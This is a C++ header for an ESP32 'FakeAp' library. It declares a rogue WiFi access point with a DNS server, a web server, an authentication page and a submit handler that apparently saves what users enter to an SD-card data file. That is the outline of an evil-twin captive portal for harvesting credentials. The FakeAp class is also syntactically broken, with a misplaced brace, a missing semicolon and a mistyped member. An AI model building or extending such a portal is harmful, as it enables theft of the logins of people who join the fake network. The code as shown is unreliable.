/**
 * @file FakeAPlib.h
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief 
 * @version 0.1
 * @date 2024-12-08
 * 
 * @copyright Copyright (c) 2024
 * 
 */

#ifndef FAKEAPLIB_LIB
#define FAKEAPLIB_LIB

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD_MMC.h>
#include <FS.h>

#define AUTHPAGE "/webpages/authentication.htm"
#define THKSPAGE "/webpages/thanksPage.htm"
#define DATAFILE "/data/data.txt"

namespace sdfiles
{
    char* getCardType (uint8_t card);

    void sdinit();

    void listDir(fs::FS &fs, const char * dirname, uint8_t levels);
    void createDir(fs::FS &fs, const char * path);
    void removeDir(fs::FS &fs, const char * path);
    String readFile(fs::FS &fs, const char * path);
    void writeFile(fs::FS &fs, const char * path, String& message);
    void appendFile(fs::FS &fs, const char * path, String& message);
    void renameFile(fs::FS &fs, const char * path1, const char * path2);
    void deleteFile(fs::FS &fs, const char * path);
    void testFileIO(fs::FS &fs, const char * path);
}


namespace fakeap
{
    extern WebServer _server;
    extern DNSServer _dnsserver;
    extern const char* authPage_;
    extern const char* thksPage_;
    extern const char* datafile_;

    void apinit(const char* &ssid, const byte &DNS_PORT);

    void handleRoot();
    void handleSubmit();
}

class FakeAp
{
public:
    FakeAp(){};
    FakeAp(const char* ssid)
        : _ssid{std::move(ssid)}
    {

    }
    FakeAp(const char* ssid, const char* psw)
        : _ssid{std::move(ssid)}, _psw{std::move(psw)}
    {

    }
    FakeAp(const char* ssid, const char* psw, IPAddress ipaddr)
        : _ssid{std::move(ssid)}, _psw{std::move(psw), _ipaddress{std::move(ipaddr)}}
    {

    }

protected:
    const char* _ssid,
                _psw;
    IPAddress   _ipaddress
};

#endif

#ifndef SD_MMC_CMD
#define SD_MMC_CMD 15
#endif

#ifndef SD_MMC_CLK
#define SD_MMC_CLK 14
#endif

#ifndef SD_MMC_D0 
#define SD_MMC_D0 2
#endif